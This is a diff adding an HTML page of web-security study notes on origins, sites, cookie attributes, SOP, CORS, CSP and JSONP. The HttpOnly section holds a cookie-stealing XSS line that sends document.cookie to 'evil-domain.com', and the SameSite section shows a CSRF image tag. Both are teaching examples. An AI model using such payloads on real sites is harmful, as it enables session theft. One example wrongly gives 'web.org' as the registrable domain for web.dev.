@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link href="css/styles.css" rel="stylesheet" type="text/css" media="all">
+        <link rel="shortcut icon" href="favicon.ico" />
+        <title>Web Fundamentals Notes</title>
+    </head>
+
+    <body>
+        <div id='main'>
+            <header>Web Fundamentals Notes</header>
+
+            <nav>
+                <h1>Table of Contents</h1>
+                <ul>
+                    <li>
+                        <a href='#definitions'>Definitions</a>
+                    </li>
+                    <li>
+                        <a href='#cookies'>Cookies</a>
+                    </li>
+                    <li>
+                        <a href='#sop-cors'>Same Origin Policy and CORS</a>
+                    </li>
+                </ul>
+            </nav>
+
+            <main>
+
+                <article id='definitions'>
+                    <h1>Definitions</h1>
+
+                    <section id='definitions-domain'>
+                        <h2>Domain vs Subdomain</h2>
+
+                        <p><span>&#10148;</span>
+                            A <b>subdomain</b> is part of a larger <b>domain</b>
+                        </p>
+
+                        <h3 class='example-title'>Examples</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p class='example'>
+                            In <b>sub.main.org </b>, <b>sub</b> is the <b>subdomain</b> of <b>main.org</b>
+                        </p>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p class='example'>
+                            In <b>main.org</b>, <b>main</b> is a <b>subdomain</b> of the <b>org</b> TLD (top level domain)
+                        </p>
+                    </section>
+
+                    <section id='definitions-site'>
+                        <h2>Site</h2>
+
+                        <p><span>&#10148;</span>
+                            <b>Site</b> is determined by the <b>registrable domain</b> of the <b>host</b> within the <b>Origin</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Defined by <b>Public Suffix list</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            <b>Subdomains</b> of the same site are considered the same site
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            <b>Protocol</b> and <b>Port</b> are not relevant
+                        </p>
+
+                        <h3 class='example-title'>Examples of Same Site</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p class='example'>
+                            <b>https://dev.main.org/en-US/docs/</b>
+                        </p> 
+                        <p class='example'>
+                            <b>https://about.main.org/en-US/</b>
+                        </p> 
+                        <p class='example'>
+                            The <b>registrable domain</b> here is <b>main.org</b>
+                        </p>
+                        
+                        <div class='example-divider'>&#8487;</div>
+                        <p class='example'>
+                            <b>www.web.dev</b>
+                        </p> 
+                        <p class='example'>
+                            <b>static.web.dev</b>
+                        </p>
+                        <p class='example'>
+                            The <b>registrable domain</b> here is <b>web.org</b>
+                        </p>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p>
+                            <b>http://example.com:8080</b>
+                        </p>
+                        <p>
+                            <b>https://example.com</b>
+                        </p>
+                        <p class='example'>
+                            The <b>registrable domain</b> here is <b>example.com</b>
+                        </p>
+
+                        <h3 class='example-title'>Examples of Different Site</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p>
+                            <b>https://main.org</b>
+                        </p>
+                        <p>
+                            <b>https://cool.com</b>
+                        </p>
+                        <p class='example'>
+                            There is no common <b>registrable domain</b> here
+                        </p>
+                    </section>
+
+                    <section id='definitions-origin'>
+                        <h2>Origin</h2>
+
+                        <p><span>&#10148;</span>
+                            Resource defined by 3 components of the <b>URL</b>:
+                        </p>
+                        <ul class='origin-components'>
+                            <li class='scheme'>
+                                <b>Scheme (protocol)</b>
+                            </li>
+                            <li class='host'>
+                                <b>Host (domain)</b>
+                            </li>
+                            <li class='port'>
+                                <b>Port</b>
+                            </li>
+                        </ul> 
+                        <p><span>&#10148;</span>
+                            <span class='scheme'>https</span>://<span class='host'>example.com</span><span class='port'>:8080</span>/about
+                        </p>
+                            
+                        <p><span>&#10148;</span>
+                            Two resources have the <b>same origin</b> if <b>all 3 components match</b>.
+                        </p>
+
+                        <h3 class='example-title'>Examples of Same Origin</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <ul class='example'>
+                            <li>http://example.com/app1</li>
+                            <li>http://example.com/app2</li>
+                            <li>http://example.com:80</li>
+                            <li>http://example.com</li>
+                        </ul>
+                        <p class='example'>
+                            <b class='scheme'>Protocol</b>, <b class='host'>Host</b>, and <b class='port'>Port</b> are the <b>same</b> for all above URLs
+                        </p>
+
+
+                        <h3 class='example-title'>Examples of Different Origin</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <ul class='example'>
+                            <li>http://example.com/app1</li>
+                            <li>https://example.com/app2</li>
+                        </ul>
+                        <p class='example'>
+                            <b class='scheme'>Protocols</b> are <b>different</b>
+                        </p>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <ul class='example'>
+                            <li>http://example.com</li>
+                            <li>http://www.example.com</li>
+                            <li>http://myapp.example.com</li>
+                        </ul>
+                        <p class='example'>
+                            <b class='host'>Hosts</b> are <b>different</b>
+                        </p>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <ul class='example'>
+                            <li>http://example.com</li>
+                            <li>http://www.example.com:8080</li>
+                        </ul>
+                        <p class='example'>
+                            <b class='port'>Ports</b> are <b>different</b>
+                        </p>
+
+                    </section>
+                </article>
+
+
+                <article id='cookies'>
+                    <h1>Cookie Access Behavior</h1>
+
+                    <p><span>&#10148;</span>
+                        <b>Cookies </b>work on the concept of <b>Sites </b>and <b>domains</b>, <b>NOT Origins</b>
+                    </p>
+                    <p><span>&#10148;</span>
+                        <b>Cookies</b> do <b>NOT obey the SOP (Same Origin Policy)</b>, they were created before SOP
+                    </p>
+
+                    <section id='domain-path'>
+                        <h2>Domain, HostOnly, Path attributes define the scope of a cookie</h2>
+
+                        <h3>Domain attribute</h3>
+
+                        <p><span>&#10148;</span>
+                            Define which <b>hosts</b> are allowed to receive cookie
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            If <b>unspecified</b>, default to <b>same origin</b> that set the cookie, <b>excluding subdomains</b> (sets <b>HostOnly</b> attribute to <b>true</b>)
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            If <b>specified</b>, <b>subdomains</b> are <b>ALWAYS</b> included (sets <b>HostOnly</b> attribute to <b>False</b>)
+                        </p>
+
+                        <h4 class='example-title'>Examples</h4>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p>
+                            If cookie set by <b>main.org</b> has <b>Domain unspecfied</b>, cookie <b>CANNOT</b> be accessed by <b>sub.main.org</b> subdomain (<b>HostOnly</b> will be set to <b>true</b>)
+                        </p>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p>
+                            If cookie set by <b>main.org</b> has <b>Domain=main.org</b>, cookie can be accessed by <b>sub.main.org</b> subdomain (<b>HostOnly</b> will be set to <b>false</b>)
+                        </p>
+
+
+                        <h3>Path attribute</h3>
+
+                        <p><span>&#10148;</span>
+                            Indicates a <b>URL path</b> that must exist in the requested URL in order to send the Cookie
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            <b>Never rely on it</b>, set to root "/"
+                        </p>
+
+                        <h4 class='example-title'>Examples</h4>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p>
+                            If <b>Path=/docs</b>, cookie will be sent on:
+                        </p>
+                        <ul>
+                            <li>
+                                <b>/docs</b>
+                            </li>
+                            <li>
+                                <b>/docs/about</b>
+                            </li>
+                            <li>
+                                <b>/docs/about/what</b>
+                            </li>
+                        </ul>
+
+                    </section>
+
+                    <section>
+                        <h2>Cookies can only be accessed by equal or more specific domains</h2>
+
+                        <h3 class='example-title'>Examples</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p>
+                            <b>sub.main.org</b> cookies <b>CANNOT</b> be accessed by <b>main.org</b> domain because <b>main.org</b> is <b>less specific</b>
+                        </p>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p>
+                            If <b>main.org</b> cookies have <b>Domain=main.org</b>, <b>sub.main.org</b> can access them because <b>sub.main.org</b> is <b>more specific</b>
+                        </p>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <p>
+                            If <b>main.org</b> cookies have <b>Domain unspecified</b>, <b>sub.main.org</b> subdomain <b>CANNOT</b> access them and will only be available to <b>main.org</b> domain
+                        </p>
+                    </section>
+                    
+                    <section>
+                        <h2>All accessible cookies by a URL will be sent on every request to a URL</h2>
+
+                        <h3 class='example-title'>Examples</h3>
+
+                        <p>
+                            If you have <b>5 cookies</b> for <b>main.org</b> and you navigate to <b>main.org</b>, you will send those <b>5 cookies</b> in the <b>request</b>. If you then click on a link to go to <b>main.org/about</b>, you will send those <b>5 cookies</b> <b>again</b>. If you then click on a link to go to <b>main.org/shopping</b>, you will send those <b>5 cookies</b> <b>again.</b>
+                        </p>
+                    </section>
+
+                    <section>
+                        <h2>SameSite attribute</h2>
+
+                        <p><span>&#10148;</span>
+                            Lets servers require that a cookie <b>NOT</b> be sent with cross-site requests
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Remember a <b>Site</b> only cares about the <b>domains</b> (<b>http://example.com:8080</b> and <b>https://example.com</b> are considered the <b>same Site</b>)
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Helps mitigate <b>CSRF (cross-site request forgery attacks)</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            <b>3 possible values:</b>
+                        </p>
+                        <ul class='samesite-wrapper'>
+                            <li>
+                                <p class='samesite'>Strict</p>
+                                <p>Sent only in <b>first party context</b> (like navigating within current domain)</p>
+                            </li>
+                            <li>
+                                <p class='samesite'>Lax</p>
+                                <p>Same as <b>Strict</b>, but allows cookie to be sent if <b>user navigates</b> to URL from <b>external site</b> (by clicking on a link for example)</p>
+                            </li>
+                            <li>
+                                <p class='samesite'>None</p>
+                                <p><b>No restrictions</b> on cross-origin requests</p>
+                            </li>
+                        </ul>
+
+                        <h3 class='example-title'>Examples</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>If SameSite=Strict and user following a link from another site/email, cookie is NOT sent</h4>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Go to this <a href='https://f8fe62e626a0.ngrok.io/setCookieStrict' target='_blank' rel='noopener noreferrer'><b>site</b></a> to set <b>SameSite=Strict</b> cookie
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Follow this <a href='https://f8fe62e626a0.ngrok.io/getHeaders'  target='_blank' rel='noopener noreferrer'><b>link</b></a> from the same website and see that the cookie is <b>NOT sent</b> in the header
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    In the <b>new tab</b> you just opened, go to the <b>URL bar</b> and hit enter to see that the cookie <b>IS</b> now sent in a <b>first party context</b> (navigating within the same domain)
+                                </li>
+                            </ol>
+                        </article>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>If SameSite=Strict and picture is being requested on another site, cookie is NOT sent</h4>
+                        <article class='demo'>
+                            <p>Picture of <b>dog</b> below:</p>
+                            <picture>
+                                <img src='https://be7b99a55e76.ngrok.io/dog.jpeg' alt='dog'>
+                            </picture>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Open up the <b>Network Tab</b>, refresh this page, and view the Network request for the <b>dog.jpeg</b> image resource. You will see the cookie is <b>NOT sent</b> in the headers for this request.
+                                </li>
+                            </ol>
+                        </article>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>If SameSite=Lax and user following a link from another site/email, cookie IS sent</h4>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Go to this <a href='https://f8fe62e626a0.ngrok.io/setCookieLax' target='_blank' rel='noopener noreferrer'><b>site</b></a> to set <b>SameSite=Lax</b> cookie
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Follow this <a href='https://f8fe62e626a0.ngrok.io/getHeaders'  target='_blank' rel='noopener noreferrer'><b>link</b></a> from the same website and see that cookie <b>IS sent</b> in the header
+                                </li>
+                            </ol>
+                        </article>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>If SameSite=Lax and picture is being requested on another site, cookie is NOT sent</h4>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Open up the <b>Network Tab</b>,refresh this page, and view the Network request for the <b>dog.jpeg</b> image resource. You will see the cookie is <b>NOT sent</b> in the headers for this request.
+                                </li>
+                            </ol>
+                        </article>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>If SameSite=None and picture is being requested on another site, cookie IS sent</h4>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Go to this <a href='https://f8fe62e626a0.ngrok.io/setCookieNone' target='_blank' rel='noopener noreferrer'><b>site</b></a> to set <b>SameSite=None</b> cookie
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Open up the <b>Network tab</b>, refresh this page, and view the Network request for the <b>dog.jpeg</b> image resource. You will see the cookie <b>IS sent</b> in the headers for this request.
+                                </li>
+                            </ol>
+                        </article>
+                       
+                        <h3 class='example-title'>Examples of CSRF prevented by Samesite</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>Attacker includes image on forum that is really a request to your bank's server</h4>
+                        <p class='code-snippet'>
+                            &lt;img src='https://bank.example.com/withdraw?from=bob'&gt;
+                        </p>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>Attacker includes form on their attack page being submitted to your bank on page on load</h4>
+
+                        <h3 class='example-title'>Impact on Trackers due to SameSite</h3>
+
+                        <p><span>&#10148;</span>
+                            A <b>Tracking Pixel</b> is a common implementation 
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            <b>Tracking Pixel</b> can contain many <b>embedded resources</b> (image or inline scripts usually) from a <b>different website</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            <b>script text="text/javascript" function</b> that may load a <b>third party script</b> or use <b>methods</b> from a previously loaded third party script
+                        </p>
+
+                        <p class='code-snippet'>
+                            &lt;img height=1 width=1 border=0 style='display:none;'' src='//tracking.website.com/trackpath?track_param=1000'&gt;
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Cookies set by Tracking Site would <b>NO LONGER</b> be sent with third party network requests unless <b>SameSite=None</b>
+                        </p>
+
+                    </section>
+
+
+                    <section>
+
+                        <h2>Secure Attribute</h2>
+
+                        <p><span>&#10148;</span>
+                            Cookie only sent over <b>HTTPS</b> protocol
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Helps mitigate <b>MITM (man-in-the-middle)</b> attacks
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Should not be relied upon and <b>sensitive data should not be stored in cookies</b>
+                        </p>
+
+                        <h3 class='example-title'>Examples</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>Cookie with Secure attribute will NOT be SENT to HTTP origin</h4>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Go to this <b>HTTPS</b> <a href='https://f8fe62e626a0.ngrok.io/setCookieSecure' target='_blank' rel='noopener noreferrer'><b>site</b></a> to set a <b>Secure</b> cookie
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Follow this <b>HTTPS</b> <a href='https://f8fe62e626a0.ngrok.io/getHeaders'  target='_blank' rel='noopener noreferrer'><b>link</b></a> from this website and see that cookie <b>IS sent</b> in the header
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Follow this <b>HTTP</b> <a href='http://f8fe62e626a0.ngrok.io/getHeaders'  target='_blank' rel='noopener noreferrer'><b>link</b></a> from this website and see that cookie is <b>NOT sent</b> in the header
+                                </li>
+                            </ol>
+                        </article>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>Cookie with Secure attribute CANNOT be SET by HTTP origin</h4>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Go to this <b>HTTP</b> <a href='http://f8fe62e626a0.ngrok.io/setCookieSecure' target='_blank' rel='noopener noreferrer'><b>site</b></a> to try setting a <b>Secure</b> cookie <b>(does not work)</b>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Follow this <b>HTTP</b> <a href='http://f8fe62e626a0.ngrok.io/getHeaders'  target='_blank' rel='noopener noreferrer'><b>link</b></a> from this website and see that cookie is <b>NOT sent</b> in the header
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Follow this <b>HTTPS</b> <a href='https://f8fe62e626a0.ngrok.io/getHeaders'  target='_blank' rel='noopener noreferrer'><b>link</b></a> from this website and see that cookie is <b>NOT sent</b> in the header
+                                </li>
+                            </ol>
+                        </article>
+                    </section>
+
+                    <section>
+
+                        <h2>HTTPOnly Attribute</h2>
+
+                        <p><span>&#10148;</span>
+                            Makes cookie <b>inaccessible</b> to <b>JavaScript Document.cookie API</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Helps mitigate <b>XSS (cross-site scripting attacks)</b>
+                        </p>
+
+                        <h3 class='example-title'>Examples</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>
+                            Cannot access cookie set by JavaScript
+                        </h4>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Go to this <a href='https://f8fe62e626a0.ngrok.io/setCookieOnly' target='_blank' rel='noopener noreferrer'><b>site</b></a> to set a <b>HttpOnly</b> cookie
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Follow this <a href='http://f8fe62e626a0.ngrok.io/getHeaders'  target='_blank' rel='noopener noreferrer'><b>link</b></a> to verify the <b>HttpOnly</b> cookie was set
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Follow this <a href='https://f8fe62e626a0.ngrok.io/cookiesjs.html'  target='_blank' rel='noopener noreferrer'><b>link</b></a> to view the cookies that are available through <b>JavaScript</b>. Note the <b>HttpOnly</b> cookie is <b>NOT present</b>
+                                </li>
+                            </ol>
+                        </article>
+
+                        <h3 class='example-title'>Example of XSS prevented by HTTPOnly</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>
+                            Malicious code loaded that makes request to attacker's server with the cookie (obtained through JavaScript) as query
+                        </h4>
+                        <p class='code-snippet'>
+                            (new Image()).src = 'http://www.evil-domain.com/steal-cookie?cookie=' + document.cookie;
+                        </p>
+
+                    </section>
+
+
+                </article>
+
+
+                <article id='sop-cors'>
+                    <h1>SOP (Same Origin Policy) and CORS (Cross-Origin Resource Sharing)</h1>
+
+                    <section id='sop'>
+                        <h2>SOP behavior</h2>
+
+                        <p><span>&#10148;</span>
+                            Security mechanism that <b>restricts</b> how a document or script loaded from one origin can interact with a resource from another origin
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            <b>fetch API</b> built <b>obeying SOP</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Network request is <b>ALWAYS sent</b>, what is being determined if the <b>response</b> can be <b>READ</b>
+                        </p>
+                        
+
+                        <h3>Sites CAN:</h3>
+                        <ul>
+                            <li><span>&#10148;</span>
+                                <b>Link</b> to other sites
+                            </li>
+                            <li><span>&#10148;</span>
+                                <b>Embed</b> resources form other sites
+                            </li>
+                            <li><span>&#10148;</span>
+                                <b>Submit forms</b> to other sites
+                            </li>
+                        </ul>
+                        <h3>Sites CANNOT:</h3>
+                        <ul>
+                            <li><span>&#10148;</span>
+                                <b>Modify content</b> from other sites
+                            </li>
+                            <li><span>&#10148;</span>
+                                <b>Read data</b> from other sites (meaning <b>put into variable</b> and do something with it)
+                            </li>
+                        </ul>
+
+                        <h3>Cross-Origin embedded resources allowed</h3>
+                        <ul>
+                            <li><span>&#10148;</span>
+                                <b>JavaScript</b> with <b>script src='...'</b>
+                            </li>
+                            <li><span>&#10148;</span>
+                                <b>CSS</b> with <b>link rel='stylesheet' href='...'</b>
+                            </li>
+                            <li><span>&#10148;</span>
+                                <b>img</b> tags
+                            </li>
+                            <li><span>&#10148;</span>
+                                <b>iframes</b>
+                            </li>
+                        </ul>
+
+                        <h3>Ways to relax SOP (non-CORS)</h3>
+                        <h4 class='sop-relax'>document.domain</h4>
+                        <p><span>&#10148;</span>
+                            <b>Bad Idea</b>
+                        </p>
+                        <p><span>&#10148;</span>
+                            Attacker can set <b>same domain as target domain</b>
+                        </p>
+
+                        <h4 class='sop-relax'>Encode data in URL fragment identifiers '#'</h4>
+                        <p><span>&#10148;</span>
+                            <b>Parent can navigate child iframes</b> without following links or refreshing page
+                        </p>
+                        <p><span>&#10148;</span>
+                            <b>Child can poll for changes</b> to fragment identifier
+                        </p>
+
+                        <h4 class='sop-relax'>postMessage API</h4>
+                        <p><span>&#10148;</span>
+                            send strings and data cross-origin
+                        </p>
+                        <p><span>&#10148;</span>
+                            <b>Sender must specify origin</b> which is permitted to receive message
+                        </p>
+                        <p><span>&#10148;</span>
+                            <b>Receiver must specify origin</b> which is permitted to send message
+                        </p>
+                    </section>
+
+                    <section id='cors'>
+                        <h2>CORS behavior</h2>
+
+                        <p><span>&#10148;</span>
+                            <b>Relaxes SOP</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Uses <b>additional HTTP headers</b> to tell browsers to give web app running at <b>one origin access to selected resources from another origin</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            <b>Credentials</b> such as Cookies are by <b>default NOT sent</b> (specific flag has to be set)
+                        </p>
+
+                        <h3>Simple Requests</h3>
+
+                        <p><span>&#10148;</span>
+                            Use one of the following <b>methods</b> in the <b>request</b>:
+                        </p>
+                        <ul>
+                            <li>
+                                <b>GET</b>
+                            </li>
+                            <li>
+                                <b>HEAD</b>
+                            </li>
+                            <li>
+                                <b>POST</b>
+                            </li>
+                        </ul>
+
+                        <p><span>&#10148;</span>
+                            Allowed <b>Content-Type</b> header
+                        </p>
+                        <ul>
+                            <li>
+                                <b>application/x-www-form-urlencoded</b>
+                            </li>
+                            <li>
+                                <b>multipart/form-data</b>
+                            </li>
+                            <li>
+                                <b>text/plain</b>
+                            </li>
+                        </ul>
+
+                        <p><span>&#10148;</span>
+                            Limited <b>custom HTTP headers</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Server response needs to send back <b>Access-Control-Allow-Origin</b> header that allows <b>requesting domain</b> to use
+                        </p>
+
+                        <h4 class='example-title'>Examples of CORS</h4>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h5 class='example'>Server not configured with CORS by default</h5>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Click the button <b>below</b> to send a <b>fetch</b> request some JSON data from the <b>same origin</b>
+                                    <button id='fetch-same-origin'>Fetch JSON data from Same Origin</button>
+                                    <div id='data-wrapper-same'></div>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    You will see a bunch of JSON data displayed <b>above</b> from the <b>same origin</b> resource
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Click the button <b>below</b> to send a <b>fetch</b> request for some JSON data from a <b>different origin without CORS enabled</b> 
+                                    <button id='fetch-different-origin'>Fetch JSON data from Different Origin</button>
+                                    <div id='data-wrapper-different'></div>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Open up the <b>console</b> and you will see <b>errors</b> related to <b>SOP</b> and the <b>absence</b> of the <b>Access-Control-Allow-Origin</b> header
+                                </li>
+                            </ol>
+                        </article>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h5 class='example'>Server configured with CORS available to all domains</h5>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Click the button <b>below</b> to send a <b>fetch</b> request for some JSON data from a <b>different origin with CORS enabled</b>
+                                    <button id='fetch-cors'>Fetch JSON data from Different Origin</button>
+                                    <div id='data-wrapper-cors'></div>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    You will see a bunch of JSON data now appear <b>above</b>. If you open up the <b>Network tab</b> and check the <b>response headers</b>, you will see the <b>Access-Control-Allow-Origin</b> flag set to <b>'*'</b>
+                                </li>
+                            </ol>
+                        </article>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h5 class='example'>Server configured with resource restricted specific domains</h5>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Click the button <b>below</b> to send a <b>fetch</b> request for some JSON data from a <b>different origin</b> with <b>CORS restricted to certain domains</b>
+                                    <button id='fetch-restrict'>Fetch JSON data from Different Origin</button>
+                                    <div id='data-wrapper-restrict'></div>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Open up the <b>console</b> and you will see <b>errors</b> because the resource is <b>restricted to certain origins</b>
+                                </li>
+                            </ol>
+                        </article>
+
+
+                        <h3>CORS Preflight Requests</h3>
+
+                        <p><span>&#10148;</span>
+                            Happens if a <b>non-simple method</b> is used for a <b>request</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            An <b>HTTP request</b> using <b>OPTIONS</b> method is <b>first sent</b> to other domain to determine if <b>real request</b> is <b>safe to send</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            2 other <b>request</b> headers sent along with <b>OPTIONS</b> request:
+                        </p>
+                        <ul>
+                            <li>
+                                <b>Access-Control-Request-Method</b>
+                            </li>
+                            <li>
+                                <b>Access-Control-Request-Headers</b>
+                            </li>
+                        </ul>
+
+                        <p><span>&#10148;</span>
+                            <b>Server response</b> includes the following headers:
+                        </p>
+                        <ul>
+                            <li>
+                                <b>Access-Control-Allow-Origin</b>
+                            </li>
+                            <li>
+                                <b>Access-Control-Allow-Methods</b>
+                            </li>
+                            <li>
+                                <b>Access-Control-Allow-Headers</b>
+                            </li>
+                            <li>
+                                <b>Access-Control-Max-Age</b>
+                            </li>
+                        </ul>
+                        
+                        <h4 class='example'>Example</h4>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h5 class='example'>Preflight Request because of non-simple Content-Type</h5>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Click the button <b>below</b> to send a fetch request that requires <b>preflight</b> (uses <b>Content-Type text/json</b>)
+                                    <button id='fetch-preflight'>Fetch JSON data from Different Origin</button>
+                                    <div id='data-wrapper-preflight'></div>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Open up the <b>Network tab</b> and view the requests for <b>data.json</b>. You should see an <b>OPTIONS</b> request <b>followed</b> by a <b>GET</b> request since we were using a <b>non-simple Content-Type</b>.
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    In the <b>preflight request</b>, notice the following headers:
+                                    <ul class='preflight-headers'>
+                                        <li>
+                                            <b>Access-Control-Allow-Origin</b>
+                                        </li>
+                                        <li>
+                                            <b>Access-Control-Request-Method</b>
+                                        </li>
+                                        <li>
+                                            <b>Access-Control-Request-Headers</b>
+                                        </li>
+                                    </ul>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    In the <b>preflight response</b>, notice the following headers:
+                                    <ul class='preflight-headers'>
+                                        <li>
+                                            <b>Access-Control-Allow-Origin</b>
+                                        </li>
+                                        <li>
+                                            <b>Access-Control-Allow-Methods</b>
+                                        </li>
+                                        <li>
+                                            <b>Access-Control-Allow-Header</b>
+                                        </li>
+                                    </ul>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    In the <b>actual GET response</b>, notice the <b>Access-Control-Allow-Origin</b> header
+                                </li>
+                            </ol>
+                        </article>
+
+                    </section>
+
+                    <section id='csp'>
+                        <h2>CSP (Content Security Policy)</h2>
+
+                        <p><span>&#10148;</span>
+                            <b>Server response header</b> that <b>limits</b> our site from making <b>requests to other sites</b>
+                        </p>
+                        <p><span>&#10148;</span>
+                            <b>meta tag</b> can also be used to configure a policy
+                        </p>
+                        <p><span>&#10148;</span>
+                            Added <b>XSS security layer</b>
+                        </p>
+
+                        <h3 class='example-title'>Examples</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>Page with No CSP configured</h4>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Follow this <a href='/pages/nocsp.html' target='_blank' rel='noopener noreferrer'><b>link</b></a> for a page that shows an <b>embedded image</b> with <b>no CSP configured</b>
+                                </li>
+                            </ol>
+                        </article>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>Page with CSP configured</h4>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Follow this <a href='/pages/csp.html' target='_blank' rel='noopener noreferrer'><b>link</b></a> for a page with <b>CSP implemented as a meta tag</b>, restricting loading of resources to its <b>own origin only</b>. Check the <b>console</b> for <b>CSP related messages</b>
+                                </li>
+                            </ol>
+                        </article>
+
+                    </section>
+
+                    <section id='jsonp'>
+                        <h2>JSONP</h2>
+
+                        <p><span>&#10148;</span>
+                            If make request to server that is <b>configured to handle JSONP</b>, can pass a <b>special parameter</b> to tell the server <b>about your page</b> so that the server can send back a <b>response your page can handle</b>
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            <b>fetch</b> API and <b>axios</b> package do <b>NOT support JSONP</b>requests
+                        </p>
+
+                        <p><span>&#10148;</span>
+                            Can use <b>jQuery</b> or <b>npm</b> packages
+                        </p>
+                        <pre class='code-snippet'><code>
+        $.ajax({
+            type: 'GET',
+            url: 'server.com',
+            dataType: 'jsonp',
+            error: (err) => {
+                console.log(err)
+            },
+            success: (data) => {
+                console.log(data)
+            }
+        })</code>
+                        </pre>
+
+                        <h3 class='example-title'>Examples</h3>
+
+                        <div class='example-divider'>&#8487;</div>
+                        <h4 class='example'>JSONP request</h4>
+                        <article class='demo'>
+                            <ol>
+                                <li><span>&#x279F;</span>
+                                    Click the button <b>below</b> to send a <b>fetch</b> request to a <b>different origin with CORS not configured</b>
+                                    <button id='fetch-json'>Fetch JSON data from Different Origin</button>
+                                    <div id='data-wrapper-json'></div>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Open up the <b>console</b> and see <b>CORS related errors</b>
+                                </li>
+                                <li><span>&#x279F;</span>
